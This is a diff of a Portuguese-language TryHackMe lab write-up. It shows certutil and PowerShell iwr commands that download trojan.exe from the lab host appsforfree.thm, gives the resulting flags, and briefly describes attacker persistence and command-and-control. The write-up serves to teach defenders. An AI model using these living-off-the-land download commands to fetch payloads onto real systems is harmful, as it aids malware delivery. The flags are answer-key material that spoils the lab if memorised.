@@ -165,7 +165,9 @@ Depois, abra o CMD e faça o download do arquivo da mesma URL utilizando curl.ex
 
 Continue no CMD e com a URL, mas agora utilizando o certutil.exe. Qual a flag de resposta? Utilizando o comando `certutil -urlcache -split -f http://appsforfree.thm/trojan.exe flag.txt` e analisando o arquivo flag.txt, recebo a flag: `THM{abusing_certutil}` 
 
-Por último, faça o download do mesmo arquivo com PowerShell IWR. Qual a flag? Utilizando o comando `powershell -Command "iwr -Uri 'http://appsforfree.thm/trojan.exe' -OutFile 'arquivo.txt'"` executando via powershell para não abrir outro terminal. Analiso o arquivo gerado e consigo a flag `THM{power_of_powershell}`
+Por último, faça o download do mesmo arquivo com PowerShell IWR. Qual a flag? Utilizando o comando `powershell -Command "iwr -Uri 'http://appsforfree.thm/trojan.exe' -OutFile 'arquivo.txt'"`
+executando via powershell para não abrir outro terminal. Analiso o arquivo gerado e consigo a flag `THM{power_of_powershell}`
+
 -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Após conseguir os dados, os atacantes focam também em conseguir persistência para futuros ataques. Geralmente, incluem o dispositivo infectado em redes de botnets, para espionagem ou para conseguir entrada em outros sistemas. Como nos casos:
 Para isso, utilizam técnicas de comando e controle: Command and Control, Tactic TA0011 - Enterprise | MITRE ATT&…, muitas vezes nem é necessário porque podem utilizar o serviço de RDP, mas muitos escolhem iniciar uma sessão de conexão C2 geralmente um arquivo que vem no download do malware anterior e, como usuários podem acabar deletando o arquivo que atua como um espião, o atacante providencia um arquivo extra para manter a conexão.
